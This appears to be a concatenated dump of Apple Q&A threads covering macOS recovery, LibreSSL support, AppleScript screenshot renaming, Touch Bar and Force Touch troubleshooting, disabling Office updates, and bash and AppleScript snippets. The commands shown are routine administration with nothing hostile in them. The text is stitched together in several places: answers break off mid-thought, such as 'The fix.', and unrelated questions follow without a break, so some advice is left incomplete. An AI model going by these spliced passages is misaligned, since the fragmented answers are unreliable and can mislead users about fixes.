diagnoses any hardware issues. No issues were reported, however looking at the logs it was apparent it was only troubleshooting the 2GB OS X Base System disk. So again, it looks like the internal hard drive (256GB) is not visible.\nAnd at this point, going through all the SO threads I feel like I am in a loop. Running diskutil list from terminal in internet recovery returns 14 disk images (disk0-->disk13), but the total size adds up to a little over 2 GB so that's not too promising. Disk0 is the only one with a name and it's OS X Base System. \nAre there any terminal commands I may find useful? Should I get my screwdriver out and dig in to the laptop? Thank you in advance.\n\nA: This happened to me too. It means your hard drive is unpartitioned. Go to Disk Utility and add a partition to the hard drive which you just formatted. You can use MacOS Journal File System while doing so. Once this is done, you will see the hard drive in the UI that asks you to choose where to install the OS when restoring the MacOS.\n", "Q: How \"official\" is libressl support in High Sierra? I am trying to port an OpenSSL-based C program from Linux to macOS, and I would like to use a library for TLS which is officially supported by the OS, because then the OS keeps that library up-to-date and secure without any extra work for me or the user of my application.\nI though LibreSSL was officially supported in macOS and I have already ported my program have a LibreSSL backend, but I'm unsure of the state of LibreSSL within macOS. Is there any official documentation that addresses whether developers should treat the LibreSSL library as depricated or not?\nPS: I've searched on Apple's developer site, but the official Apple documentation about encrypting network communication makes ABSOLUTELY NO mention of LibreSSL (which is not the same as OpenSSL).\n\nA: MacOS provided openssl-0.9.8 (when the world was using 1.0.2, and contemplating 1.1 and 1.1.1) until High Sierra release. Now in MacOS 10.13.5 it's libressl-2.2.7, while the current libressl is 2.7.4.\nIt looks like MacOS-provided LibreSSL does not come with any engines, and it is unclear whether it's possible to even add an engine to it. That means - no openssl using keys on hardware tokens accessible via PKCS#11, no hardware RNG accessible via PKCS#11 or RDRAND, etc. \nUPDATE: It also doesn't seem to have the include files required to compile your applications. So it seems that you cannot build your software against MacOS LibreSSL even if you wanted to (well, you might be able to by downloading LibreSSL-2.2.7 yourself, etc. - but I'm very sure it isn't worth the hassle).\nSince I don't want to write code that runs only on Mac, I can't afford to get stuck with Apple Secure Transport or such.\nTherefore my personal recommendation would be to install and work with a \"real\" openssl, installing it via Macports (as I did for the \"production\" stuff on my systems) or Brew. In that case, the package maintainers would track the updates and security fixes for you, but you maintain compatibility with your Linux code with minimal efforts.\n\nA: To answer the question asked:\n\nHow “official” is libreSSL support in High Sierra?\n\nThere is no official support.  Apple makes available all Open Source code that it uses in macOS/OS X.  From the latest version of High Sierra (10.13.3) all the way back to Lion 10.7.0, there is no mention of libreSSL.\nThis is not to say that it will not work if you choose to install the libraries.  It's that they don't officially use the code in macOS.  If you do get it working and something breaks when you upgrade macOS, it will be up you to fix it.\nApple has deprecated* OpenSSL and instead is utilizing Common Crypto, something Apple develops.\n\n*Deprecated as in no longer developed but not removed.  OpenSSL is still included for backward compatibility, but developers are notified that there is no further development and should begin to move to the newer technology.\n\nA: The only officially supported TLS library on macOS is Apple Secure Transport:\n\nSecure Transport\nSecure network communication using standardized transport layer security mechanisms.\nThe Security.SecureTransport API gives you access to Apple's implementation of Secure Sockets Layer version 3.0 (SSLv3), Transport Layer Security (TLS) versions 1.0 through 1.2, and Datagram Transport Layer Security (DTLS) version 1.0.\n\nThis means that LibreSSL is NOT supported by Apple for use as a TLS library in your application.\nThis means that as a responsible developer, you should either:\na) Use Apple Secure Transport\nb) Statically link with a library, such as LibreSSL, you support yourself\nor\nc) Dynamically link with a a library, such as LibreSSL, that you clearly indicate to the user that he needs to support himself through for example HomeBrew\n", "Q: Command + C does not always work on first try on MacOS Command + C does not always work on first try on any of my four Macs.

How can I resolve this?\n*I use bettersnaptool and enable three finger dragging, but the issue still appears when I disable them.\n\nA: I think it's possible for Apple's Continuity Universal Clipboard feature to cause something like this, depending on the quality of the signal connection with any nearby iOS devices.\nPerhaps try turning off \"Allow Handoff between this Mac and your iCloud devices\" in System Preferences > General and see if that helps.\n\nA: I've found a cause of the same problem. An app may use it as a hotkey. In my case, I use a dictionary app (Eudic), which will read the clipboard if cmd+c is pressed twice.\nAn easy way to check whether it is caused by an app is to activate the Guest account, which usually has few autostart apps, and to check whether the problem still exists.\n\nA: This issue is real and I think every mac user experience it on a weekly basis, but likely people continue to doubt themselves over if they actually command c or not properly.\nThe fix.

How can I elicit a prompt that will let me rename every screenshot I take?\nThank you\n\nA: I used Cocktail to specify that screenshots are saved to a folder called \"Screenshots\" on my Mac. I use an app called \"Hazel\" to watch that folder and to automatically run an AppleScript that shows a dialog box asking if I want to rename the screenshot. \nHere is the dialog box that pops up automatically:\n\nHere is a screenshot of Hazel, with my \"Name it\" rule:\n\nClicking the edit (pencil) button in that window shows you the conditions under which the rule will run. As you can see, Hazel will run the AppleScript if the file is an image, added today, whose comment does NOT contain the word \"Hazel.\" Since newly-made screenshots do not have comments with the word \"Hazel\" in them, these are the right conditions. (When the script runs, it adds a comment with the word \"Hazel\" in it to the file.)\n\nHere is my AppleScript. \ntell application \"System Events\"\n    set the_apps to every process whose frontmost is true\n    set the_app to item 1 of the_apps\n    set the_app_name to name of the_app\n    set old_name to name of theFile\n    set the_choice to display dialog \"If you want to rename this file, do it\" buttons {\"Rename\", \"No thanks\"} default button \"Rename\" default answer old_name\nend tell\n\nif the button returned of the_choice is \"Rename\" then\n    set the_date_string to do shell script \"date '+%Y.%m.%d'\"\n    tell application \"Finder\"\n        set the comment of theFile to \"Name changed with Hazel\"\n        set the_name to text returned of the_choice\n        set cleaned_name to change \" \" into \"_\" in the_name\n        set cleaned_name to the_date_string & \"_\" & cleaned_name\n        if (characters 12 thru 13 of cleaned_name as string) is \"wm\" then\n            move theFile to (POSIX file \"/Users/cboyce/Dropbox/Screenshots/Webmaster Screenshots\")\n        else\n            move theFile to (POSIX file \"/Users/cboyce/Dropbox/Screenshots/Renamed Screenshots\")\n        end if\n        set the name of theFile to cleaned_name & \".png\"\n    end tell\nend if\ntell application the_app_name to activate\n\nThe first part of the script records the name of the frontmost app at the time of the screenshot's creation. It also has the \"Display Dialog\" step. \nThe second part of the script renames the screenshot and moves it to a \"Renamed Screenshots\" folder. If I put \"wm\" at the beginning of the file's new name, the script puts the renamed screenshot into a special \"Webmaster Screenshots\" folder. The script also replaces spaces with underscores, but you would not have to include that part. Notice also that the script sets the comment of the screenshot to \"Name changed with Hazel.\" You of course can make your own conditions but this works for me.\nYou will have to change the username in the script, in the two lines that start with \"move theFile.\" Replace \"cboyce\" (my username) with whatever yours is. If you're not sure what yours is, find the Users folder at the top level of your Mac's hard drive, open that up, and look for the folder with the house icon. The name of that folder is the username. Actually, you have to change the entire path. I'm saving my renamed screenshots into folders stored in my Dropbox folder but you of course can put them where you like. So change the path in those \"move theFile\" lines to point to YOUR folders.\nHazel is commercial software but you can use it in Demo mode for free. Demo mode allows you to watch only a single folder, which in your case is all you need. You can download Hazel from Noodlesoft.com.\n\nA: You might try using the app Grab. It comes with your system software and is stored in the Utilities folder. You can use Grab to take a screenshot, then click on menu item File and choose Save. This will allow you to name the file and select folder to store screen shot.\n\nA: You might create a Service with Automator.app, to which you can assign a shortcut in the Services Preferences (even existing ones can be overwritten).\nOpen Automator, select Service as the type of document, select in the upper part of the window: Service receives no input in any application.\nDouble-click action Run AppleScript or drag it into the right half of the window and insert the following script:\nset destFolder to \"/Path/to/the/Folder/\" --insert here path to Screenshot folder\n\nset screenshotName to text returned of (display dialog \"Screenshot\" default answer \"\")\nset destFile to destFolder & screenshotName & \".png\"\n\n---------------------------------------\n-- give a warning in case file is already existing\ntry\nalias (POSIX file destFile)\nset _exists to true\nrepeat until _exists is false\ntry\nset screenshotName to text returned of (display dialog \"Filename is already existing!\" default answer \"\")\nalias (POSIX file (destFolder & screenshotName & \".png\"))\non error\nset _exists to false\n    end try\nend repeat\nset destFile to destFolder & screenshotName & \".png\"\nend try\n\n---------------------------------------------\n\ndo shell script \"screencapture -io \" & quoted form of destFile\n\n(*\n--------------------------\nscreencapture:\n-i = Capture screen interactively\n-o = In window capture mode, do not capture the shadow of the window\n--------------------------\n*)\n\nBe sure to insert the path to your screenshot folder in the first line!\nThe script does not rename ... but first sets the name and then creates the screenshot.\nTo access the \"Services Preferences\" quickly, click on the name of the currently active program in the menu bar (e.g. Safari) and select \"Services Preferences\" in the \"Services\" menu item. Find your created Service there and add a shortcut to it ... e.g. cmd-ctrl-5\n", "Q: Unable to install an OS on Mac (prohibited sign) I had an issue with my MacBook Air \"Core i5\" 1.6 13\" (Early 2015) (MacBookAir7,2) and after repeated problems I decided to wipe the computer and give it a clean slate. \nI downloaded a copy of Mavericks and Yosemite off the internet and created a bootable external hard drive with an iMac. I've tried both Mavericks and Yosemite but always get the prohibited sign. \nI tried cmd + S while booting with the hard drive and it said \"This version of Mac OS X is not supported on this platform\" for both versions of OS X. The funny thing is I tried the bootable hard drive with the old iMac I have in the house and it booted into the installer just fine. \nWhat can I do to fix this issue?\n\nA: To start with your MacBook Air will not run Mavericks, so you can put that one aside as incompatible.\nAs for Yosemite, the earliest possible version that will run on your model MacBook Air is actually Mac OS X 10.10.2 (build 14C2043). My guess is that the copy of Yosemite you've downloaded is either 10.10.0, 10.10.1 or a build version of 10.10.2 earlier than 14C2043.\nRegardless, your best option is usually to boot into Recovery Mode.\nRecovery Mode\nYou can boot into Recovery Mode and reinstall macOS from there. You will have up to three options:\n\n\n*\n\n*Hold down the commandR keys as soon as you power up to reinstall the latest macOS that was installed on your Mac, without upgrading to a later version \n\n*Hold down the optioncommandR keys as soon as you power up to upgrade to the latest macOS that is compatible with your Mac\n\n*Hold down the shiftoptioncommandR keys as soon as you power up to reinstall the macOS that came with your Mac, or the version closest to it that is still available1\n1 That third option is a new option only available since 27 March 2017 and requires macOS Sierra 10.12.4.\nFor more info refer to: About macOS Recovery\nIMPORTANT - Your question doesn't specify where you've downloaded the installers from. Please note that if you haven't downloaded them directly from Apple then there is no way for anyone here to confirm the suitability/safety of what you've downloaded. \n\n[UPDATE]\nSince you're having problems with Recovery Mode I suggest you reset your Non-Volatile Random-Access Memory (NVRAM).\nResetting the NVRAM\nTo do this on your MacBook Air, follow the steps below.\nNOTE: Before following the steps below, ensure you have no external hardware connected and make sure you use the built-in keyboard.\n\n\n*\n\n*Fully shut down your machine.\n\n*Press the power button and then press the commandoptionPR keys. You have to make sure you press these keys before the gray screen appears or it won’t work.\n\n*Hold those keys down until your Mac reboots again and you hear the startup chime for the second time.\n\n*Let go of the keys\n\n\nOnce you've reset the NVRAM, power off and try the various Recovery Mode keyboard shortcuts again.\n", "Q: How do I record a weightlifting exercise on an Apple Watch? On an Apple Watch Series 2 with WatchOS 4.2.3, how can I record a weightlifting session on the Workout App?\nI’m currently recording my sessions as “Other”, but I’d like to categorize them as something more specific in my activity history.\n\nA: As far as I can tell, your best bet is to go through this process:\n\n\n*\n\n*On your Apple Watch open the Workout app\n\n*Use the crown to navigate to the Other option\n\n*Tap on this to begin your weightlifting exercise workout\n\n*After completing the workout, swipe right and tap on the red END cross\n\n*When the summary appears you'll see a grey Name Workout button - tap on that\n\n*Now you'll see a list of categories, initially grouped by Popular categories and then listed in alphabetical order\n\n*Use the crown to scroll through the choices and tap the one that best fits (I see that Strength Training is listed as a popular choice - perhaps that's a suitable option)\n\n*Now the label will appear on the Summary screen\n\n*Use the crown to scroll to the bottom of the summary screen and tap on the Done button\n\n\nNow you'll find that whatever category you selected will be available in your list of main Workout options when you launch the Workout app. It also means this option can be used by the Activity app on your iPhone so that your workout history is more informative/applicable to what you're doing.\n", "Q: MacOS High Sierra : Xcode failed to download Use the purchase page Error during installing Xcode 9.3 Yesterday I update MacOS Sierra to MacOS High Sierra than I remove xCode 9.2 after that when I try to install xCode 9.3 from App Store, It gives me below error:\nXcode failed to download, Use the purchase page to try again\nI tried below solutions.\n1.

I want to prioritize WiFi over celular data, which are paid and limited.\n\nA: If your personal hotspot is on all the time (even when you are not using it), your iPhone will tether its 3G connection to any Mac or PC with iTunes by default when connected with a usb, and you can do nothing to change this behavior.

Next day I noticed that phone discharges really fast. Power saving mode helps, but also the problem still appear. And the problem is not in apps running in background that could take power too much. Now it also gets very hot when charging, like never before. What could be the problem? Could it be that the battery life is almost over?\n\nA: If the USB Car charger doesn't have the MFi (made for iPhone) logo then it is probably a cheap charger with minimal over-voltage protection circuits inside, even if it says Philips on the outside. This can cause damage to the charge circuit on your phone's logic board and ultimately your battery. \nWaze really sucks the juice out of a battery and having that charger on for 3-4 hours straight may have damaged your phone. Try running your phone inside and charging with an Apple original wall cube to see if that makes a difference. If not, then you will need to have that phone looked at by either Apple or an independent micro-soldering repair shop. \n", "Q: iOS reading list doesn't work offline When I add some webpage to my reading list (like Medium articles, I'm not able to read them if I'm offline: I have a error telling my phone is not connected to Internet.\nAccording to the documentation, pages in the reading list should be accessible offline (I checked Settings > Safari > Reading List > Automatically Save Offline).\nIs it a bug?\n\nA: Adding something to your reading list\n\n\n*\n\n*On your desired webpage, click the share icon in the top-right\n\n\nWhen opening something from your reading list make sure you open it at the side not in the search bar.\nFrom this Apple Discussion:\n\nOnce you add something to your reading list you do not access it from the URL box.

I am able to login and connect to the server normally but when I try to launch an application, terminal opens XQuartz but it cannot generate any windows. I am having the same issue with another simulation code that is installed locally but uses XQuartz to generate some UI elements — the point of saying this is that I don't believe it is any issue with connecting to the server.\nFurthermore, if I open XQuartz normally and try to open the XQuartz terminal nothing happens. Under XQuartz>Applications> there are also \"xman\" and \"xlogo\" options that don't do anything when clicked. Previously I remember clicking \"xlogo\" would open up a small icon of XQuartz in a window. So this seems like something is preventing XQuartz from opening any kind of desktop windows. \nOne last note, if I try to run a terminal command that normally opens XQuartz, then XQuartz launches but doesn't generate any windows like previously mentioned but also I cannot close XQuartz. Quitting XQuartz just causes it to restart a second later (likewise for force quit). The only way to keep it from reopening is to log out. This makes it seem to me like the original command that uses the X11 window server is continually trying to open it without success causing XQuartz to come up — even if I close terminal.\nI noticed this issue the first time I installed Xcode and Python IDLE. I have since removed and reinstalled every combination of XQuartz and Xcode.\nLooking for any suggestions short of reinstalling macOS.\n\nA: Reinstalling macOS from the online recovery option (Command-Option-R at startup) fixed the issue.

Japan uses 100V; I will be in parts of the country using both 50Hz and 60Hz. Will I need a voltage converter for a) a MacBook power supply, b) a standard AC-to-USB plug? I live in the U.S.\n\nA: The MacBook power supply is rated for 50-60hz and 100-240V. The 5W USB also falls within these specs.\nYou can confirm your own devices by looking at the power brick and reading the input section. (See image below.)\nThe non-polarized, ungrounded, two prong US plug style works in Japanese outlets, so an Apple 5W USB charger will fit without an adapter. The MacBook charger will work if you use the two prong attachment instead of the grounded, three prong extension.\nYou do not need a voltage, frequency, or plug-shape adaptor in Japan with a US MacBook power supply and iPhone/iPad USB power supply.\n\nNote that while the standard US two prong plug fits in a Japanese outlet, you still have to make sure that the device can use 100V, 50/60Hz power. Different devices and brands have different requirements. Be careful to confirm the input voltage and frequency of your power supply. Using a power supply on a power system that is out of range can cause damage to your device.\n", "Q: How to replace retina MacBook Pro rubber feet? The rubber feet of my late 2013, 15\" retina Macbook Pro are breaking and falling off. From what I’ve gathered, Apple doesn’t sell these feet and expects you to pay about $100 for a replacement of the bottom panel.\nBut I’ve found some feet online (last image) and was told I do not need to remove the bottom panel to replace them. I’m somewhat doubtful if this claim and want to make sure.\nIs there a tutorial with video or step-by-step photos that replaces these (including documenting the removal of the old ones)?\n\n\n\n\nA: You can follow the instructions in the Apple Support document, MacBook Pro: Bottom case foot replacement DIY instructions.\nThere is absolutely no need to shell out money to replace the entire bottom panel. However, the article explicitly mentions that the DIY replacement kit is not available for MacBook Pro with Retina display computers. The procedure shared appears quite straightforward.\nAs apparent from the article, glue can be used to stick the feet to the bottom panel. On the other hand, this Youtube video gives a good demonstration of how to remove the bottom panel and place the bottom feet the recommended way.\nI have had a similar situation with my Late 2013 15\" retina MacBook Pro. I have used glue to paste the falling off feet to the back panel.\n", "Q: Installing virtualenvwrapper on macOS Sierra - \"-bash: /usr/local/bin/virtualenvwrapper.sh: No such file or directory\" error I'm a bit of a newbie to Python and definitely to virtual environments and Django.

On my Late 2016 15\" MBP running 10.13.4 the Touch Bar/Touch ID are not functional, but only when I am booted in Safe Mode. The ESC key doesn't appear either (when holding the fn key) and doesn't work if I try to just imagine it's there (I tried Force Quit shortcut--cmd opt esc). \nI've reinstalled the OS several times and have cleared the NVRAM but this issue has persisted and began before the release of High Sierra. From what I can gather online it seems that the Touch Bar should work when in Safe Mode since booting into Safe Mode seems to be frequently recommended when others report issues with their Touch Bar.\nDoes anyone have any idea what might be causing this or what files and processes might be effecting it?\n\nA: Assuming I understand your problem correctly (i.e. this issue is not present during Safe Mode) then your best bet is to investigate login items, fonts, and kernel extensions. \nInvestigating login items, fonts, and kernel extensions\nLet's start with Login Items:\n\n\n*\n\n*Startup normally\n\n*Go to System Preferences > Users & Groups\n\n*Select the Login Items tab\n\n*Take a note of your Login Items \n\n*Now remove all of them by highlighting them and clicking on the - button below\n\n*Restart your computer\n\n\nNow your Mac will boot up without those login items loading. Test to see if your Touch Bar and Touch ID work okay now.\n\n\n*\n\n*If they work okay, you know one (or more) of the Login items were causing the problem. You can then add them back in one by one until you've identified the culprit. Problem solved.\n\n*If they still don't work, it's either a problem with fonts you've installed yourself or with a 3rd party kernel extension. A little more info below:\n\n\nFonts:- You can remove any of the fonts you've installed yourself to see if this makes a difference.\nKernel Extensions:- You can open Terminal (found within your Utilites folder) and enter the following command:\nkextstat | grep -v com.apple\nThe above command will list 3rd party kernel extensions (you may need to stretch the Terminal window so it's easier to read). Look for anything you don't remember installing, or something that belongs to software you've removed, or just anything that looks out of place. Remember though, this is a list of 3rd party kernel extensions and therefore any of them could be causing the problem.\nCreate another user\nIf your Touch Bar and Touch ID still don't work after going through the above process, you could create a new user in Apple > System Preferences > Users & Groups and then log into that user to see if the problem persists. If it doesn't persist, it may be better to use that user (or create another one you're happy to use) and migrate your data across to that account.\nIf all else fails\nIf none of the above works it may be time do a totally fresh installation of macOS (your question didn't specify whether you had already tried a \"fresh\" installation - but if you've already tried this then it may be best to try installing an earlier version of High Sierra).\nNOTE: Make sure you have a current backup if you decide to do a full fresh installation of macOS.\n\nA: I have the exact same issue. It suddenly stopped working a few days ago. I tried every possible way to revive it. At first the sudo pkill command worked but after a few sleep/ restart nothing appeared in the touchbar though blind touch seems to work but I tried switching between sierra , mojave, catilina , and could not revive the touch bar. and did factory reset and the blind touch seems to gone . Throughout all of this my Touch Id seems to work just fine and works everytime. Is there any way to determine wheather this is a hardware issue or software issue. I think I have done every possible thing that is found in the internet regarding software. I live in Bangladesh now. The laptop was bought in uk and used it there 2 years without any problem. when I brought it here in bangladesh and started using with a different account after a factory reset it worked for a few days and then boom.... any Help?\n", "Q: Is it possible to disable the interlocutor's video in BlueJeans for iOS?

This feature is no longer available in iOS 11.\nAccording to Twitter (https://help.twitter.com/en/using-twitter/revoke-twitter-access-on-ios-app) :\n\nNote: Though you will see other specific apps like Twitter for iPhone\n  or Camera for iOS listed in your active connections, you cannot revoke\n  access to these individual apps; you have to revoke access for the\n  entire iOS integration.\n\nHow do I revoke those apps' access if all my devices are running iOS 11?\n\nA: I finally found the answer to my own question.\n\"iOS integration\" itself is actually listed among all those apps and it has a revoke button. Once you revoke this, all apps authorized through iOS integration will disappear.\n\nA: You can revoke access to those apps from the Desktop or Mobile version of twitter only as iOS 11 does not have that feature anymore. Follow the instructions below.\n\n\n*\n\n*Go to Settings -> Account\n\n*Go to Connected Apps under Data and permissions for all apps which you have given access (For Mobile)\n\n*Go to Apps (For Desktop)\n\n*Select the app you want to remove.\n\n*Select Revoke Access.\n\n\nYou should be able to do this for all the unwanted apps.\n", "Q: Is there anyway to stop Microsoft Office 2016 on macOS prompting for update? I want to stop this prompt:\n\nNormally I’d encourage people to keep their system / app up-to-date, but there is only one word that can describe what Microsoft had done in Office for Mac: catastrophe.\nTheir Apr 2018 update destroyed the ability to display / assign Asian font correctly. Prior to the update, I can view & set Asian font using the Asian name of a font family (e.g. \"細明體\" instead of \"PMingLiU\"). But after update all fonts are displayed using English font family name. I can stil use these Asian fonts, but it's no longer be compatible with Windows version.\nBesides, the performance is severely declined after update: the text input curser can’t even catch up with my typing speed.\nI've managed to revert to older version via Time Machine backup.

You can create a blank file named MAU2.0 in the \"/Library/Application Support/Microsoft\" folder.\nsudo touch \"/Library/Application Support/Microsoft/MAU2.0\"\n\n\n\nA: The most elegant way is to:\n\n*\n\n*Remove com.microsoft.update.agent.plist from /Library/LaunchAgents folder.\n\n\n*Disable the accessibility to the updater with\nsudo chmod 500 /Library/Application\\ Support/Microsoft/MAU2.0\n\nIf you just do step 2 and skip step one you might run into UserEventAgent Process not being able to execute step 1 properly when booting the computer and this leading to high CPU load for hours.\nThis will disable the Microsoft Office Update mechanism and also remove the update-message within the Office Applications. It also removes the \"Search for Updates\" drop down in the menu \"Help\" within the Office Applications.\nWhen you would like to update the system you either undo the steps above or just install/deploy the newest patches. You might have to re-run step 1 and 2 after installing the patches.\n(Tested on OSX 10.13.6 with Word/Excel 16.26)\n\nA: If you get Office from the Mac App Store, that handles all updates. You can delete your old version of the app and get It from Apple now. You do need an office 365 license, so if you have volume license or an older type license the App Store might not work for you for free. \nIf for some reason you are getting the app elsewhere, the usual way is to open updates from the word help menu and enable manual update checks.\n\nThe Microsoft Auto Update program (MAU) is undergoing pretty rapid and dramatic improvements including the ability to set preferences to control updates as well as command line updates.

To select the key file you click a file selection dropdown. A Finder window pops up and opens the folder I previously navigated to with this file dropdown and presents you the folder where I stored the key file. In terms of security, you understand this is not desirable behaviour.\nIdeally I would want Finder to just open the default folder that pops up when I open a new Finder window. I would like to modify this behaviour for this specific application, but a system wide solution is also welcome. I don't mind clicking through several folders.\nI am on a relatively fresh install of MacOS High Sierra 10.13.4 and I'm not afraid of tinkering with the Terminal or AppleScript. I just don't know where to start.\n\nA: Alas, my question was not so popular that it inspired people to answer my question. But after rephrasing my google search terms and some investigation of my own. I found a solution to this.\nIt appears every application stores these previously opened folders as defaults, which is also the command you need in Terminal to see and reset this value.\nI stumbled upon this Quora answer which introduced me to the defaults command. It seems all you need is the bundle identifier of your application (in the source example org.videolan.vlc) and the namespace of the default you are trying to erase.\nI found the bundle identifier of my application by typing lsof | grep [appname] \n (which isn't very reliable, because the application name could differ slightly from the bundle identifier) and looking for Library (which commonly hold folder names with these bundle identifiers) in the result. But you can also do defaults read > defaults.log and search the file for your the path of the folder you are trying to erase the default for.\nThis led me to the namespace NSNavLastRootDirectory. So all I have to do is execute the command defaults delete com.bundle.identifier NSNavLastRootDirectory everytime right before I open the application. \nHow I am going to do that? I'm not sure yet. Probably some Applescript solution.\nFurthermore I was wondering if I used the right tags for this, since my question got so little attention. \n", "Q: Some Force Touch gestures stop working (2016 MBP 13-inch w/ Touch Bar) Something strange sometimes happens when I'm working on my 2016 MBP 13-inch w/ Touch Bar (Mac OS 10.13.4). I don't know exactly why, but occasionally certain gestures (i.e. pinch to zoom in and zoom out, force touch over a word to open the dictionary) simply stop functioning until I lock and unlock the laptop. Other gestures (mission control, move across desktops) keep working. This happens to all the apps I try to use (Safari, Word, Pages, Ulysses, Mind Node and so on). I can still use keyboard shortcuts to perform those actions.\nAs I said, the only solution I could find is to lock and unlock the laptop or just reboot it, but I would like to know if there is a better, permanent fix to this issue.\n\nA: Sometimes my touchpad getting mad, click force is strange, sound is also strange and force touch isn't working mostly, till until restart. It hardly seems like a software problem, so whenever you restart everything works fine.\nThe problem occurred much less times after i did a following things:\n\n\n*\n\n*Clear NVRAM\n\n*Install every available Software Updates\n\n*Also make sure to clean your touch pad and it's borders, sometimes it can lead to an issue\n\n\nAlso, most of the time that problem occurs after sleep/hibernation, so most likely it is software problem.\n\nA: I had a similar issue where three-finger-swipe gestures stopped working. Either deactivating and reactivating these gestures in the system settings or putting the Mac to sleep solved that problem. \nIt turned out that the window manager \"Magnet\" caused the issue for me. When I quit Magnet, the problem doesn't occur anymore (Credits to minimalmo at Reddit).\nEdit: I asked the author of \"Magnet\" if this issue could be fixed, but never received a response. I tried \"BetterSnapTool\" as an alternative, which seems to work well.\n", "Q: Reinstall El Capitan on 2009 iMac I've giving my 2009 iMac to a friend. It was running El Capitan and Windows 10 on Bootcamp. I've tried to be clever (which apparently I'm not) and I've done a clean reset of Windows 10, not understanding that I would no longer be able to see or access Mac. Yes, all traces of macOS have disappeared.  Even the Mac keyboard doesn't work, presumably because I've lost all Bootcamp drivers.  \nThe Mac partition may still be there somewhere, as the Windows partition only takes 130GB of the 500GB HDD. So somehow, I need to restore macOS using a Windows mouse and keyboard.

This is expected, because it's full screen, but if you're using an app with tabs (like Visual Studio Code), the menu bar often drops down when you're trying to switch tabs. This can be infuriating. \nGoogle Chrome doesn't have this issue because the developers have cleverly coded the app to move the tab bar down when the menu bar appears. Unfortunately this option isn't available in Firefox or Visual Studio Code. \nI've been trying to find a way to permanently show the menu bar when apps are fullscreened as a workaround. \n\nA: I don't know if this is considered full screen but if I click on green button in top left corner of app while holding down option key, the app screen will maximize but leave apple menu visible.\n\nA: Here's how I did it. \nI installed an app called Magnet which is a neat Window manager for MacOS. It brings Windows' neat Window snapping feature to MacOS and lets you designate how much of the screen a window should take up. One of the modes it has, \"Maximise\", actually resizes a Window to fill the screen without fullscreening it.\n\nAs you can see the results are pretty good. The one down side of this approach is that using Magnet to \"Maximise\" a window doesn't create a new desktop Space like MacOS fullscreen mode does, but you can manually create a Space using the mission control spaces bar and maximise the app there with Magnet. You can then use Mission control to move this Space around with Mission Control as normal, but it will have a generic name like 'Desktop 2' etc\n\n\nA: When I had this exact same problem, the other posts worked but I found a (seemingly) new setting in VS Code that allows for the quick switch to the macOS menu tab using just a keyboard shortcut (fn + ctrl + f2) once the following setting had been set.\n\n\n*\n\n*Preferences > Settings > Window\n\n*Check \"Native Tabs\"\n\n\nThat did the trick for me in the Code app. \n\nA: ctrl+fn+f2\nctrl+fn+f2\nctrl+fn+f2\n\nA: If you create a new desktop from mission control, then use jmh's answer, you will get the same behavior as just pressing the green button alone, but preserve the menu bar. \n\nA: With macOS Monterey you finally can!

MacOS has just (last couple of days) started placing a red circle with a white number on the Calendar (version 8.0 (2034.9)) icon, as if there are calendar notifications sitting around, waiting to be read. It's just like the mail notification that tells you how many unread emails you have, or the App Center notification that tells you how many unapplied updates you have.\nWhen I open up the calendar, I likewise see that number next to one of my Google calendars.\nBut in reality there are no notifications that need dismissal. That calendar hasn't even had any events this week. The context menu offers no clues, nor do I see anything in the Preferences that illuminates this new behavior. The Notification Center has nothing from the Calendar.\nWhat on earth is causing this? How do I get rid of this Red Bubble of Disinformation?\n\nA: I discovered the cause once I arrived at work: the notifications, which came from an airline, were sitting on my desktop computer, waiting to be approved. For some reason, they didn't pop up on my laptop while I was at home. (possibly different OS version: 10.11.6 vs. 10.10.5)\nIt still isn't disappearing from my laptop, but hopefully if I wait it out a while Apple's Calendar will get around to noticing.\n", "Q: How do I reply to a mail with in-line comments on iOS?

I have asked the vendor for support and will answer should I get an answer, but I wondered if I could find a cause or fix for missing icon previews on the OS level.\n\nWhat's super odd is that Finder and the macOS app switcher show the correct icons - just LaunchBar 6 Version 6.9.4 seems to be dropping the icons. I'm seeing this on 10.12.6 and 10.13.x and the issue persists after a reboot.\nIs there an icon services API or subsystem that could need rebuilding or is this just a third party issue where the tool needs a fix or reset?\n\nA: Well - it turns out LaunchBar was reporting things as they are and Finder and the rest of the systems started dropping the icons to match what this utility was showing.\nI have recovered from the failure by rebuilding the launch services database.\nThe short command is lsregister -kill -seed and here's the full path\n  /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -kill -seed\n\nThis still hasn't figured out why they went wrong, but it's a rebuild step that can be taken once the number of \"broken\" icons become aggravating. This is very odd to me since the lsregister command used to be vey handy when duplicate open as records were present, but I didn't have that symptom here. Also, typically cleaning icon caches in /var/folders and then performing a safe boot. That's not something I ever liked contemplating and was very happy to not have to resort to trying that in this case.\n", "Q: Help with waiting while a process is running I'm looking for a bash script that checks if the Installer process is running and waits/pause if it then proceeds once the process is no longer running.\nHere is what I have so far:\n #!/bin/bash\n PROCESS=\"Installer\";\n PID=$(ps -A |grep -m1 \"$PROCESS\" | awk '{print $1}');\n while s=`ps -p $PID -o s=` && [[ \"$s\" && \"$s\" !='Z'  ]]; do\n     echo \"$PROCESS is Running, waiting for it to close\"\n     sleep 1\n done\n echo \"$PROCESS is not Running\";\n SCRIPT HERE\n\n\nA: I took your script and changed\n\n\n*\n\n*Changed the PID assignment to pgrep\n\n*Changed -o s= to -o stat= for ps\n\n*Removed the unnecessary ; at the end of some lines\n\n\nIt's a bit hard to test, but something like\n#!/bin/bash\nPROCESS=\"Installer\"\nPID=$(pgrep \"$PROCESS\")\nwhile s=`ps -p $PID -o stat=` && [[ \"$s\" && \"$s\" != 'Z' ]]; do\n    echo \"$PROCESS is running, waiting for it to terminate\"\n    sleep 1\ndone\necho \"$PROCESS is not running anymore\"\nSCRIPT HERE\n\nshould work.\nIf you are not worried about the Installer getting into Zombie state you could rely on the fact that ps exits with 1 if no process is found, and significantly simplify the loop condition.\n", "Q: Applescript to run javascript on chrome Is there a way to run an Javascript using AppleScript\nhere is the JS :\njavascript:Array.from(document.getElementsByClassName('action-button')).forEach(function(v){v.removeAttribute(\"disabled\");});\n\nI tried this\ntell application \"Google Chrome\"\n    tell tab 2 of window 1 to set RemoveBtRestriction to execute javascript \"javascript:Array.from(document.getElementsByClassName('action-button')).forEach(function(v){v.removeAttribute(\"disabled\");});\"\nend tell\n\nbut this return the error \"Expected end of line but found identifier.\"\n\nA: Try adding single quotes around the word \"disabled\".

